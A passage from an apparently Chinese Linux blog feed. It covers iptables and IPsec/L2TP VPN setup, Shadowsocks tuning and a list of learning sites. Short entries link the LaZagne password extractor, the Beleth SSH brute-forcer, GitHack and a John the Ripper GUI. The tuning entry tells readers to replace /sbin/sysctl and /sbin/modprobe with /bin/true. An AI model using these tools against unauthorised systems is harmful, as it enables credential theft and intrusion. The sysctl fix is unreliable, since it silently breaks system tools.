<p>/sbin/iptables -A FORWARD -i ppp+ -m state –state NEW,RELATED,ESTABLISHED -j ACCEPT</p>
<p>/sbin/iptables -A FORWARD -m state –state RELATED,ESTABLISHED -j ACCEPT</p>
<p>&nbsp;</p>
<p>/sbin/iptables -t nat -A POSTROUTING -s 10.0.10.0/24 -o eth0 -j MASQUERADE</p>
<p>&nbsp;<br>&nbsp;<br>再执行下面保存iptables</p>
<p>service iptables save</p>
<p>service iptables restart<br>&nbsp;<br>添加开机自启动</p>
<p>systemd enabled ipsec</p>
<p>systemd enabled xl2tpd<br>如果连接不上的话, 先关掉iptalbes试试 service iptables stop</p>
</blockquote>
<p>如果这时还连不上了，那么就是iptables的问题了</p>
<p>特别注意iptables里的顺序， INPUT和FORWARD里的REJECT一定是写在最后面，否则写在他们之后的port就都被REJECT了！</p>
<p>下面是我自己的iptables，可供参考</p>
<p>##########################################################################################</p>
<p>&nbsp;</p>
<blockquote>
<blockquote>
<p>#! /bin/bash</p>
<p>/sbin/iptables -F INPUT</p>
<p>/sbin/iptables -Z INPUT</p>
<p>/sbin/iptables -P INPUT ACCEPT</p>
<p>/sbin/iptables -A INPUT -m state –state INVALID -j DROP</p>
<p>/sbin/iptables -A INPUT -p icmp -j ACCEPT</p>
<p>/sbin/iptables -A INPUT -i lo -j ACCEPT</p>
<p>/sbin/iptables -A INPUT -p tcp -m state –state NEW,RELATED,ESTABLISHED -m tcp –dport 22 -j ACCEPT</p>
<p>/sbin/iptables -A INPUT -p tcp -m state –state NEW,RELATED,ESTABLISHED -m tcp –dport 80 -j ACCEPT</p>
<p>/sbin/iptables -A INPUT -p tcp -m state –state NEW,RELATED,ESTABLISHED -m tcp –dport 1723 -j ACCEPT</p>
<p>/sbin/iptables -A INPUT -p gre -m state –state NEW,RELATED,ESTABLISHED -j ACCEPT</p>
<p>/sbin/iptables -A INPUT -p udp -m policy –dir in –pol ipsec -m udp –dport 1701 -j ACCEPT</p>
<p>/sbin/iptables -A INPUT -p udp -m udp –dport 1701 -j ACCEPT</p>
<p>/sbin/iptables -A INPUT -p udp -m udp –dport 500 -j ACCEPT</p>
<p>/sbin/iptables -A INPUT -p udp -m udp –dport 4500 -j ACCEPT</p>
<p>/sbin/iptables -A INPUT -p esp -j ACCEPT</p>
<p>/sbin/iptables -A INPUT -m policy –dir in –pol ipsec -j ACCEPT</p>
<p>/sbin/iptables -A INPUT -m state –state RELATED,ESTABLISHED -j ACCEPT</p>
<p>/sbin/iptables -A INPUT -j REJECT –reject-with icmp-host-prohibited</p>
<p>/sbin/iptables -F FORWARD</p>
<p>/sbin/iptables -Z FORWARD</p>
<p>/sbin/iptables -P FORWARD ACCEPT</p>
<p>/sbin/iptables -A FORWARD -m state –state INVALID -j DROP</p>
<p>#/sbin/iptables -A FORWARD -m policy –dir in –pol ipsec -j ACCEPT</p>
<p>/sbin/iptables -A FORWARD -d 10.0.10.0/24 -j ACCEPT</p>
<p>/sbin/iptables -A FORWARD -s 10.0.10.0/24 -j ACCEPT</p>
<p>/sbin/iptables -A FORWARD -i ppp+ -m state –state NEW,RELATED,ESTABLISHED -j ACCEPT</p>
<p>/sbin/iptables -A FORWARD -m state –state RELATED,ESTABLISHED -j ACCEPT</p>
<p>/sbin/iptables -A FORWARD -j REJECT –reject-with icmp-host-prohibited</p>
<p>/sbin/iptables -F OUTPUT</p>
<p>/sbin/iptables -Z OUTPUT</p>
<p>/sbin/iptables -P OUTPUT ACCEPT</p>
<p>/sbin/iptables -A OUTPUT -m state –state INVALID -j DROP</p>
<p>/sbin/iptables -F -t nat</p>
<p>/sbin/iptables -Z -t nat</p>
<p>/sbin/iptables -t nat -A POSTROUTING -s 10.0.10.0/24 -o eth0 -j MASQUERADE</p>
</blockquote>
</blockquote>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[搬瓦工shadowsocks服务器TCP优化]]></title>
      <url>http://www.linux52.com/2015-09-29-e6-90-ac-e7-93-a6-e5-b7-a5shadowsocks-e6-9c-8d-e5-8a-a1-e5-99-a8tcp-e4-bc-98-e5-8c-96.html</url>
      <content type="html"><![CDATA[<blockquote>
<p>如果你想看个视频啥的更流畅，可以尝试对shadowsocks 进行优化。<br>编辑limits.conf<br>vi /etc/security/limits.conf`<br>    添加下面两行</p>
<p><pre>`* soft nofile 51200</pre></p>
<pre><code>* hard nofile 51200`&lt;/pre&gt;
开启shadowsocks服务之前，先设置一下ulimit
</code></pre></blockquote>
<pre><code>注意：这个步骤你需要先将shadowsocks 关闭（状态是stop）
&gt; &lt;pre&gt;`ulimit -n 51200`&lt;/pre&gt;
把sysctl.conf备份到root目录
&gt; &lt;pre&gt;`cp /etc/sysctl.conf /root/`&lt;/pre&gt;
修改sysctl.conf配置文件
&gt; &lt;pre&gt;`vi /etc/sysctl.conf`&lt;/pre&gt;
**将内容替换如下**
&gt; &lt;pre&gt;`fs.file-max = 51200
</code></pre><blockquote>
<pre><code>net.core.rmem_max = 67108864

net.core.wmem_max = 67108864

net.core.netdev_max_backlog = 250000

net.core.somaxconn = 4096


net.ipv4.tcp_syncookies = 1

net.ipv4.tcp_tw_reuse = 1

net.ipv4.tcp_tw_recycle = 0

net.ipv4.tcp_fin_timeout = 30

net.ipv4.tcp_keepalive_time = 1200

net.ipv4.ip_local_port_range = 10000 65000

net.ipv4.tcp_max_syn_backlog = 8192

net.ipv4.tcp_max_tw_buckets = 5000

net.ipv4.tcp_fastopen = 3

net.ipv4.tcp_rmem = 4096 87380 67108864

net.ipv4.tcp_wmem = 4096 65536 67108864

net.ipv4.tcp_mtu_probing = 1

net.ipv4.tcp_congestion_control = cubic`&lt;/pre&gt;
使其生效:
</code></pre><p><pre>`sysctl -p<br>会出现很多类似于下面的错误<br>error: permission denied on key<br>解决方案：<br>一 ：修复modprobe的：<br>rm -f /sbin/modprobe</pre></p>
<p>ln -s /bin/true /sbin/modprobe<br>二 ：修复sysctl的：<br>rm -f /sbin/sysctl</p>
<p>ln -s /bin/true /sbin/sysctl<br>再次执行：<code>sysctl -p</code></p>
</blockquote>
<p>至此。你可以选择重启服务器，或者后台开启shadowsocks (状态 start)</p>
<p>如果是官方的一键安装，还可以安装gevent。</p>
<blockquote>
<p>yum install python-devel</p>
<p>yum install gcc</p>
<p>yum install -y python-setuptools</p>
<p>easy_install pip<br>&nbsp;</p>
</blockquote>
<p>a. 安装libevent：</p>
<blockquote>
<p>yum install -y libevent<br>&nbsp;</p>
</blockquote>
<p>b. 安装greenlet：</p>
<blockquote>
<p>pip install greenlet<br>&nbsp;</p>
</blockquote>
<p>c. 安装gevent：</p>
<blockquote>
<p>pip install gevent</p>
<p>easy_install gevent<br>&nbsp;</p>
</blockquote>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[debain 手动安装ipsec+L2TP VPN 服务器]]></title>
      <url>http://www.linux52.com/2015-09-28-debain-e6-89-8b-e5-8a-a8-e5-ae-89-e8-a3-85ipsecl2tp-vpn-e6-9c-8d-e5-8a-a1-e5-99-a8.html</url>
      <content type="html"><![CDATA[<p><strong><span style="color: #ff0000;">试了下Ipsec l2tp访问速度比pptp快</span></strong></p>
<p>最近想用conoha 买个vps 架设vpn 但是查了下好多都说封了pptp协议 不知道怎么搞 查了下好多说是ipsec l2tp没封百度查了好多方面的资料 都是centos 这个没测试 因为我比较习惯debain 新手啊不懂搞了好久都不成功 刚好手头有一个美国的15元一个月的vps 先拿来架设测试下 下面就是详细过程 先上张成功图</p>
<p><a href="http://dg2016.duapp.com/wp-content/uploads/2015/09/2.png" target="_blank" rel="external"><img src="http://dg2016.duapp.com/wp-content/uploads/2015/09/2-300x230.png" alt="2"></a><a href="http://dg2016.duapp.com/wp-content/uploads/2015/09/3.png" target="_blank" rel="external"><img src="http://dg2016.duapp.com/wp-content/uploads/2015/09/3-300x210.png" alt="3"></a>这是拨号注意</p>
<p>&nbsp;</p>
<p><a href="http://dg2016.duapp.com/wp-content/uploads/2015/09/1.png" target="_blank" rel="external"><img src="http://dg2016.duapp.com/wp-content/uploads/2015/09/1-300x274.png" alt="1"></a></p>
<p>这里刚才开拨号出现789错误 查了下说什么册注册列表好麻烦</p>
<p>直接在 我的电脑右键—》管理—》服务和应用程序—-》服务 里面把<span style="color: #ff0000;">ipsec servers启动</span>就可以正常了</p>
<p>下面开记录</p>
<p>1.安装openswan</p>
<p><pre>apt-get  install openswan #（安装过程中如问到: Use an X.509 certificate for this host, 回答NO.）</pre><br>2. mv /etc/ipsec.conf /etc/ipsec.conf.bak</p>
<p>vi /etc/ipsec.conf</p>
<p><pre># /etc/ipsec.conf<br>version 2.0 # conforms to second version of ipsec.conf specification</pre></p>
<p>config setup<br> nat_traversal=yes<br> virtual_private=%v4:192.168.0.0/16,%v4:10.0.0.0/8,%v4:172.16.0.0/12,%v4:25.0.0.0/8,%v4:!10.254.253.0/24<br> protostack=netkey</p>
<p> #protostack=mast # used for SAref + MAST only<br> interfaces=”%defaultroute”<br> oe=off</p>
<p>conn l2tp-psk<br> authby=secret<br> pfs=no<br> auto=add<br> rekey=no</p>
<h1 id="overlapip-yes-for-SAref-MAST"><a href="#overlapip-yes-for-SAref-MAST" class="headerlink" title="overlapip=yes # for SAref + MAST"></a>overlapip=yes # for SAref + MAST</h1><h1 id="sareftrack-yes-for-SAref-MAST"><a href="#sareftrack-yes-for-SAref-MAST" class="headerlink" title="sareftrack=yes # for SAref + MAST"></a>sareftrack=yes # for SAref + MAST</h1><p> type=transport<br> left=xx.xx.xx.xx #你自己的外网ip<br> leftprotoport=17/1701<br> #</p>
<h1 id="The-remote-user"><a href="#The-remote-user" class="headerlink" title="The remote user."></a>The remote user.</h1><p> #<br> right=%any<br> rightprotoport=17/%any<br>一行一次</p>
<ol>
<li>用文字编辑器打开 /etc/ipsec.secrets</li>
</ol>
<p>mv /etc/ipsec.secrets /etc/ipsec.secrets.bak &amp;&amp; vi /etc/ipsec.secrets</p>
<p><pre>xx.xx.xx.xx %any: PSK “test” #你外网的ip test是共享认证密钥</pre><br>4.运行以下命令：</p>
<p><pre>for each in /proc/sys/net/ipv4/conf/*<br>do<br>    echo 0 &gt; $each/accept_redirects<br>    echo 0 &gt; $each/send_redirects<br>done</pre><br>一行一次</p>
<p>5. 检查一下 IPSec 能否正常工作：</p>
<p><pre>sudo ipsec verify</pre><br>如果在结果中看到「Opportunistic Encryption Support」被禁用了，没关系，其他项 OK 即可。</p>
<p>6.重启 openswan:</p>
<p><pre>sudo /etc/init.d/ipsec restart</pre><br>7.安装 L2TP。常用的 L2TP 后台软件包是 xl2tpd，它和 openswan 是同一帮人写的。</p>
<p>运行以下命令：</p>
<p><pre>sudo aptitude install xl2tpd</pre><br><span style="color: #ff0000;"> 如果没有找到安装包可以到<a href="http://pkgs.org/" target="_blank" rel="external">http://pkgs.org/</a> （这个好像要挂带理才能正常查看到下载包的地址）去查找 比如我在kail linux下就查找到包</span></p>
<p><span style="color: #ff0000;"><a href="http://ftp.br.debian.org/debian/pool/main/x/xl2tpd/xl2tpd_1.3.1+dfsg-1_i386.deb" target="_blank" rel="external">http://ftp.br.debian.org/debian/pool/main/x/xl2tpd/xl2tpd_1.3.1+dfsg-1_i386.deb</a></span></p>
<p>&nbsp;</p>
<p>8.用文字编辑器打开 /etc/xl2tpd/xl2tpd.conf，改成这样：</p>
<p><pre>[global]<br>ipsec saref = yes</pre></p>
<p>[lns default]<br>ip range = 10.1.2.2-10.1.2.255<br>local ip = 10.1.2.1<br>;require chap = yes<br>refuse chap = yes<br>refuse pap = yes<br>require authentication = yes<br>ppp debug = yes<br>pppoptfile = /etc/ppp/options.xl2tpd<br>length bit = yes<br>这里要注意的是 ip range 一项里的 IP 地址不能和你正在用的 IP 地址重合，也不可与网络上的其他 IP 地址冲突</p>
<p>9.安装 ppp。这是用来管理 VPN 用户的。</p>
<p><pre>sudo aptitude install ppp <span style="color: #ff0000;">#这个可以不用安装一般都默认有安装的</span></pre><br>10.检查一下 /etc/ppp 目录里有没有 options.xl2tpd 这个文件，没有的话就建一个，文件内容如下：</p>
<p><pre>require-mschap-v2<br>ms-dns 208.67.222.222<br>ms-dns 208.67.220.220<br>asyncmap 0<br>auth<br>crtscts<br>lock<br>hide-password<br>modem<br>debug<br>name l2tpd<br>proxyarp<br>lcp-echo-interval 30<br>lcp-echo-failure 4</pre><br>注意 ms-dns 两行我填的是 OpenDNS。如果你想用其他的 DNS 服务器（例如谷歌的公共 DNS），请自行更换。我直接用这个也没关系</p>
<p>11.现在可以添加一个 VPN 用户了。用文字编辑器打开 /etc/ppp/chap-secrets:</p>
<p><pre># user      server      password            ip<br>test        l2tpd       testpassword        <em></em></pre><br>如果你之前设置过 PPTP VPN，chap-secrets 文件里可能已经有了其他用户的列表。你只要把 test l2tpd testpassword  这样加到后面即可。</p>
<p>12. 重启 xl2tpd:</p>
<p><pre>/etc/init.d/xl2tpd restart</pre><br>13.设置 iptables 的数据包转发：</p>
<p><pre>iptables –table nat –append POSTROUTING –jump MASQUERADE<br>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</pre></p>
<ol>
<li><strong>配置sysctl参数</strong></li>
</ol>
<p>sudo mv /etc/sysctl.conf /etc/sysctl.conf.bak</p>
<p>sudo vim /etc/sysctl.conf</p>
<p><pre># /etc/sysct.conf</pre></p>
<h1 id="only-values-specific-for-ipsec-l2tp-functioning-are-shown-here-merge-with-existing-file"><a href="#only-values-specific-for-ipsec-l2tp-functioning-are-shown-here-merge-with-existing-file" class="headerlink" title="only values specific for ipsec/l2tp functioning are shown here. merge with existing file"></a>only values specific for ipsec/l2tp functioning are shown here. merge with existing file</h1><p>net.ipv4.ip_forward = 1<br>net.ipv4.conf.default.rp_filter = 0<br>net.ipv4.conf.default.accept_source_route = 0<br>net.ipv4.conf.all.send_redirects = 0<br>net.ipv4.conf.default.send_redirects = 0<br>net.ipv4.icmp_ignore_bogus_error_responses = 1<br>sysctl -p 加载配置</p>
<p>15.因为某种原因，openswan 在服务器重启后无法正常自动，所以我们可以在 /etc/rc.local 文件里写入如下语句：</p>
<p><pre>iptables –table nat –append POSTROUTING –jump MASQUERADE<br>echo 1 &gt; /proc/sys/net/ipv4/ip_forward<br>for each in /proc/sys/net/ipv4/conf/*<br>do<br>    echo 0 &gt; $each/accept_redirects<br>    echo 0 &gt; $each/send_redirects<br>done<br>/etc/init.d/ipsec restart</pre></p>
<p>##############################################################<br>这个可以试试下面的脚本试试看出错不</p>
<p>#!/bin/sh -e<br>iptables -t nat -A POSTROUTING -s 10.1.1.0/24 -o eth0 -j MASQUERADE</p>
<p><div>(以上脚本执行有一个错误 我没管他)到这里，设置工作已经基本完成。你可以用 iPhone 或 iPad 试着连一下</div><br>如果连接成功，上网也没问题的话，恭喜你，大功告成。如果连不上，恐怕还得多做一步。</p>
<p>Ubuntu 9.10 自带的 openswan 版本是 2.6.22, Debian Lenny 带的版本是 2.4.12。这两个版本的 openswan 都有问题。我们的测试结果表明，2.6.24 版的 openswan 可以在上述两版的 Linux 操作系统下正常工作。所以如果做完以上十四步还是连不上的话，请考虑从源码编译 openswan 2.6.24 ：</p>
<p><pre>sudo aptitude install libgmp3-dev gawk flex bison<br>wget <a href="http://www.openswan.org/download/openswan-2.6.24.tar.gz" target="_blank" rel="external">http://www.openswan.org/download/openswan-2.6.24.tar.gz</a><br>tar xf openswan-2.6.24.tar.gz<br>cd openswan-2.6.24<br>make programs<br>sudo make install</pre><br>编译需要一段时间。你的 Linux 内核版本需要高于 2.6.6。</p>
<p>然后可以删除原先通过 aptitude 安装的 openswan，并重启之：</p>
<p><pre>sudo aptitude remove openswan<br>sudo /etc/init.d/ipsec restart</pre></p>
<div>

<p>为防复制错误我这在上传了我的修改文</p>
<p><a href="http://dg2016.duapp.com/wp-content/uploads/2015/09/config.zip" target="_blank" rel="external">config下载</a></p>
<p></p></div><br>&nbsp;<p></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[LaZagne(本地密码索检)]]></title>
      <url>http://www.linux52.com/2015-08-18-lazagne-e6-9c-ac-e5-9c-b0-e5-af-86-e7-a0-81-e7-b4-a2-e6-a3-80.html</url>
      <content type="html"><![CDATA[<p><a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="external">https://github.com/AlessandroZ/LaZagne</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[SSH爆破工具–Beleth]]></title>
      <url>http://www.linux52.com/2015-08-18-ssh-e7-88-86-e7-a0-b4-e5-b7-a5-e5-85-b7-beleth.html</url>
      <content type="html"><![CDATA[<h3 id="SSH爆破工具–Beleth"><a href="#SSH爆破工具–Beleth" class="headerlink" title="SSH爆破工具–Beleth"></a>SSH爆破工具–Beleth</h3><p>下载地址：<a href="https://github.com/chokepoint/[Beleth](http://fuck.0day5.com/archives/tag/beleth" target="_blank" rel="external">https://github.com/chokepoint/[Beleth](http://fuck.0day5.com/archives/tag/beleth</a> “View all posts in Beleth”)</p>
<p><a href="http://dg2016.duapp.com/wp-content/uploads/2015/08/2015010632402945.png" target="_blank" rel="external"><img src="http://dg2016.duapp.com/wp-content/uploads/2015/08/2015010632402945-300x180.png" alt="2015010632402945"></a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[GitHack]]></title>
      <url>http://www.linux52.com/2015-08-18-githack.html</url>
      <content type="html"><![CDATA[<p>GitHack是一个.git泄露利用脚本，通过泄露的.git文件夹下的文件，重建还原工程源代码。</p>
<p>渗透测试人员、攻击者，可以进一步审计代码，挖掘：文件上传，SQL注射等安全漏洞。</p>
<p><a href="https://github.com/lijiejie/GitHack" target="_blank" rel="external">https://github.com/lijiejie/GitHack</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[密码破解神器John the Ripper GUI]]></title>
      <url>http://www.linux52.com/2015-08-18-e5-af-86-e7-a0-81-e7-a0-b4-e8-a7-a3-e7-a5-9e-e5-99-a8john-the-ripper-gui.html</url>
      <content type="html"><![CDATA[<p>Johnny是基于流行密码破解工具John the Ripper开发的跨平台开源GUI。John the Ripper是什么东西？如果直译其名字的话就是：JOHN的撕裂者(工具)。翻译的很难听吧。实际上它是一个工具软件，用于在已知密文的情况下尝试破解出明文的破解密码软件。</p>
<p><a href="http://dg2016.duapp.com/wp-content/uploads/2015/08/2015071536325425.png" target="_blank" rel="external"><img src="http://dg2016.duapp.com/wp-content/uploads/2015/08/2015071536325425-300x157.png" alt="2015071536325425"></a></p>
<p>特性</p>
<p><pre class="prettyprint lang-html prettyprinted">用户可以开始、暂停和继续破解<br>支持所有输入文件格式（纯hashes, pwdump, passwd, mixed）<br>all input file formats are supported (pure hashes, pwdump, passwd, mixed),<br>可以从session历史中继续破解<br>支持每种hash类型<br>幸运猜解功能<br>配置文件存在 .conf 文件 (~/.john/johnny.conf),<br>支持英语和法语</pre><br><a href="https://github.com/shinnok/johnny" target="_blank" rel="external">下载地址</a> <a href="https://github.com/shinnok/johnny" target="_blank" rel="external">https://github.com/shinnok/johnny</a></p>
<p>&nbsp;</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[分享50个权威的网上在线学习网站]]></title>
      <url>http://www.linux52.com/2015-06-25-e5-88-86-e4-ba-ab50-e4-b8-aa-e6-9d-83-e5-a8-81-e7-9a-84-e7-bd-91-e4-b8-8a-e5-9c-a8-e7-ba-bf-e5-ad-a6-e4-b9-a0-e7-bd-91-e7-ab-99.html</url>
      <content type="html"><![CDATA[<h2 id="艺术与音乐"><a href="#艺术与音乐" class="headerlink" title="艺术与音乐"></a><strong>艺术与音乐</strong></h2><ul>
<li><strong><a href="http://daveconservatoire.org/" target="_blank" rel="external">Dave Conservatoire</a> </strong>— 一个完全免费的音乐学习<a href="http://yusi123.com/tag/%e7%bd%91%e7%ab%99" target="_blank" rel="external">网站</a>，口号是“让每一个人都可以接受世界级的音乐教育”，有视频，有练习。</li>
<li><strong><a href="http://drawspace.com/" target="_blank" rel="external">Drawspace</a></strong> — 如果你想学习绘画，或者提高自己的绘画技能，就来Drawspace吧。</li>
<li><strong><a href="http://justinguitar.com/" target="_blank" rel="external">Justin Guitar</a></strong> — 超过800节免费的吉他课程，有自己的app，还有电子书、DVD等实用内容。</li>
</ul>
<h2 id="数学，数据科学与工程"><a href="#数学，数据科学与工程" class="headerlink" title="数学，数据科学与工程"></a><strong>数学，数据科学与工程</strong></h2><ul>
<li><strong><a href="http://www.codecademy.com/" target="_blank" rel="external">Codecademy</a> </strong>— Codecademy还用多介绍吗？学编程，来Codeacademy就对了。</li>
<li><strong><a href="http://see.stanford.edu/default.aspx" target="_blank" rel="external">Stanford Engineering Everywhere</a></strong> — 有很多免费的工程类课程资源。</li>
<li><strong><a href="http://bigdatauniversity.com/" target="_blank" rel="external">Big Data University</a></strong> — 教你如何做大数据分析。</li>
<li><strong><a href="http://betterexplained.com/" target="_blank" rel="external">Better Explained</a></strong> — 从整体图景着手，通过图像向你解释抽象的数学（还有其他领域）概念。</li>
</ul>
<h2 id="设计，网页设计与开发"><a href="#设计，网页设计与开发" class="headerlink" title="设计，网页设计与开发"></a><strong>设计，网页设计与开发</strong></h2><ul>
<li><strong><a href="http://howdesignuniversity.com/" target="_blank" rel="external">HOW Design University</a></strong> — 主要教授图像与交互设计。</li>
<li><strong><a href="http://htmldog.com/" target="_blank" rel="external">HTML Dog</a> </strong>— 学习 HTML, CSS 和 JavaScript 编程技能。</li>
<li><strong><a href="http://skillcrush.com/" target="_blank" rel="external">Skillcrush</a> </strong>— 提供职业网页设计与开发课程。</li>
<li><strong><a href="http://hackdesign.org/" target="_blank" rel="external">Hack Design</a> </strong>— 全球顶级设计师教你网页/app设计，完全免费。</li>
</ul>
<h2 id="综合"><a href="#综合" class="headerlink" title="综合"></a><strong>综合</strong></h2><ul>
<li><strong><a href="http://scratch.mit.edu/" target="_blank" rel="external">Scratch – Imagine, Program, Share</a></strong> — 为小孩子设计，通过游戏学编程。</li>
<li><strong><a href="https://www.udemy.com/" target="_blank" rel="external">Udemy</a> </strong>— 通过教学视频教你生活和工作中的实用技能，需要付费。</li>
<li><strong><a href="http://www.e-learningforkids.org/" target="_blank" rel="external">E-learning for kids</a> </strong>— 向5-12岁的儿童提供小学程度基础课程。</li>
<li><strong><a href="http://ed2go.com/" target="_blank" rel="external">Ed2go</a></strong> — 又一个学习技能的线上课程<a href="http://yusi123.com/tag/%e7%bd%91%e7%ab%99" target="_blank" rel="external">网站</a>，主要面向成年人。</li>
<li><strong><a href="http://gcflearnfree.org/" target="_blank" rel="external">GCF Learn Free</a></strong> — 由 Goodwill Community Foundation 和 Goodwill Industries 创办，教授实用技能。（我已经词穷了。。）</li>
<li><strong><a href="http://stackexchange.com/" target="_blank" rel="external">Stack Exchange</a> </strong>— 嘿！一个类似果壳问答的超赞的问答网站，回答质量都超级高。</li>
<li><strong><a href="http://www.hippocampus.org/" target="_blank" rel="external">HippoCampus</a></strong> — 主要面向中学生。</li>
<li><strong><a href="http://www.howcast.com/" target="_blank" rel="external">Howcast</a> </strong>— 通过视频学习日常生活小技能。</li>
<li><strong><a href="http://www.memrise.com/" target="_blank" rel="external">Memrise</a></strong> — 用游戏化的概念学习语言。</li>
<li><strong><a href="http://www.schooltube.com/" target="_blank" rel="external">SchoolTube</a></strong> — 面向中小学生，称有50万视频。。</li>
<li><strong><a href="http://instructables.com/" target="_blank" rel="external">Instructables</a></strong> — 一个DIY网站。</li>
<li><strong><a href="http://creativelive.com/live" target="_blank" rel="external">creativeLIVE</a></strong> — 教你摄影、音乐、设计等技能，要付费。</li>
<li><strong><a href="http://doityourself.com/" target="_blank" rel="external">Do It Yourself</a> </strong>— 教你成为家居改造达人。</li>
<li><strong><a href="http://learn.adafruit.com/" target="_blank" rel="external">Adafruit Learning System</a></strong> — 提供免费电子设备DIY教程。</li>
<li><strong><a href="http://grovo.com/" target="_blank" rel="external">Grovo</a></strong> — 学习如何使用上百种网站应用，提高自己的工作效率。</li>
</ul>
<h2 id="大学课程"><a href="#大学课程" class="headerlink" title="大学课程"></a><strong>大学课程</strong></h2><ul>
<li><strong><a href="https://www.edx.org/" target="_blank" rel="external">edX</a> </strong>— 免费学习来自全球顶尖大学（包括MIT和哈佛大学）的课程，提供付费的认证证书。<a title="" target="_blank" rel="nofollow" data-original-title="">她的课程</a>。</li>
<li><strong><a href="https://www.coursera.org/" target="_blank" rel="external">Coursera</a></strong> — 免费学习来自全球20多个国家100多所顶尖大学的课程，有提供认证证书的专项课程，由浅入深系统学习一个领域。<a title="" target="_blank" rel="nofollow" data-original-title="">她的课程</a>。</li>
<li><strong><a href="http://ocw.mit.edu/" target="_blank" rel="external">MIT Open Courseware</a> </strong>— 创建于2002年，免费提供几乎所有MIT课程的完整材料。</li>
<li><strong><a href="http://oyc.yale.edu/" target="_blank" rel="external">Open Yale Courses</a></strong> — 提供耶鲁大学的课程，既有传统的网络公开课，也有MOOC。</li>
<li><strong><a href="http://oli.cmu.edu/" target="_blank" rel="external">Open Learning Initiative</a> </strong>— 卡麦基梅隆大学的一个开放学习计划。</li>
<li><strong><a href="https://www.khanacademy.org/" target="_blank" rel="external">Khan Academy</a> </strong>— 可汗学院，最早的线上学习网站之一，内容丰富，适合任何年纪的学习者。</li>
<li><strong><a href="http://video.mit.edu/" target="_blank" rel="external">MIT Video</a> </strong>— 提供超过12,000 个讲座/视频，涵盖数学、建筑、艺术、化学、生物、人文社科、物理等领域。</li>
<li><strong><a href="http://class.stanford.edu/" target="_blank" rel="external">Stanford Online</a> </strong>— 斯坦福大学的线上学习平台。<a title="" target="_blank" rel="nofollow" data-original-title="">她的课程</a>。</li>
<li><strong><a href="http://www.extension.harvard.edu/open-learning-initiative" target="_blank" rel="external">Harvard Extension School: Open Learning Initiative</a></strong> — 哈佛大学的线上课程视频精选。</li>
<li><strong><a href="https://www.canvas.net/" target="_blank" rel="external">Canvas Network</a> </strong>— 又一个MOOC平台。<a title="" target="_blank" rel="nofollow" data-original-title="">她的课程</a>。</li>
<li><strong><a href="http://bethe.cornell.edu/" target="_blank" rel="external">Quantum Physics Made Relatively Simple</a></strong> — 理论物理学家Hans Bethe向你介绍量子物理学。</li>
<li><strong><a href="http://outreach.washington.edu/openuw/" target="_blank" rel="external">Open UW</a></strong> — 华盛顿大学的线上课程资源。</li>
<li><strong><a href="http://podcast.ucsd.edu/" target="_blank" rel="external">UC San Diego Podcast Lectures</a></strong> — 圣地亚哥大学的视频、音频资源<em>。</em></li>
<li><strong><a href="http://uopeople.org/" target="_blank" rel="external">University of the People</a> </strong>— 这是一间免学费的线上大学<em>。</em></li>
<li><strong><a href="https://novoed.com/" target="_blank" rel="external">NovoEd</a> </strong>— 学习NovoEd的课程，成为未来的领袖！</li>
</ul>
<h2 id="IT与软件开发"><a href="#IT与软件开发" class="headerlink" title="IT与软件开发"></a><strong>IT与软件开发</strong></h2><ul>
<li><strong><a href="http://www.udacity.com/" target="_blank" rel="external">Udacity</a> </strong>— 职业编程学习的不二之选，提供微学位。<a title="" target="_blank" rel="nofollow" data-original-title="">她的课程</a>。</li>
<li><strong><a href="http://developer.apple.com/" target="_blank" rel="external">Apple Developer Site</a></strong> — 学习开发 IOS、Mac OS、Safari 环境下的app.</li>
<li><strong><a href="https://developers.google.com/" target="_blank" rel="external">Google Code</a> </strong>— 学习开发安卓app.</li>
<li><strong><a href="http://code.org/" target="_blank" rel="external">Code.org</a></strong> — <a title="" target="_blank" rel="nofollow" data-original-title="">编程一小时活动</a>的大本营。想学编程？就从这里起步吧。</li>
<li><strong><a href="https://developer.mozilla.org/en-US/learn" target="_blank" rel="external">Mozilla Developer Network</a> </strong>— 不要被名字骗了，不是教你开发火狐插件。你可以学习 HTML, CSS 和JavaScript。</li>
<li><strong><a href="https://learnable.com/" target="_blank" rel="external">Learnable</a></strong> — 也是学编程，超过5000个视频<em>。</em></li>
<li><strong><a href="http://www.pluralsight.com/" target="_blank" rel="external">Pluralsight</a> </strong>— 学编程（技术盲分不出这些网站有什么区别和特色已经哭了）</li>
<li><strong><a href="http://codehs.com/" target="_blank" rel="external">CodeHS</a> </strong>— 在学校、在家学编程！</li>
<li><strong><a href="http://gymnasium.aquent.com/" target="_blank" rel="external">Aquent Gymnasium</a></strong> — 学编程。</li>
</ul>
<h2 id="语言类"><a href="#语言类" class="headerlink" title="语言类"></a><strong>语言类</strong></h2><ul>
<li><a href="http://www.duolingo.com/" target="_blank" rel="external">Duolingo</a> – 中文名「多邻国」，据说学习方式非常有效。我感觉它的app设计得不错。主要推荐英语和别的欧洲语言。（<a title="" target="_blank" rel="nofollow" data-original-title="">@秋纫</a> 补充）</li>
<li><a href="http://zh-cn.lernu.net/" target="_blank" rel="external">lernu.net</a> – 在多邻国的世界语课程出来之前，这应该是学习世界语最好的网站了吧。不过，它除了课程以外还有一个挺好玩的社区，和一些阅读材料。（<a title="" target="_blank" rel="nofollow" data-original-title="">@秋纫</a> 补充）<br>原作者 @watterfall 英文地址：<a href="http://www.bestcollegereviews.org/50-top-online-learning-sites/" target="_blank" rel="external">50 Top Online Learning Sites</a></li>
</ul>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[给 Linux 系统“减肥”,系统垃圾清理（转）]]></title>
      <url>http://www.linux52.com/2015-06-25-e7-bb-99-linux-e7-b3-bb-e7-bb-9f-e5-87-8f-e8-82-a5-e7-b3-bb-e7-bb-9f-e5-9e-83-e5-9c-be-e6-b8-85-e7-90-86-ef-bc-88-e8-bd-ac-ef-bc-89.html</url>
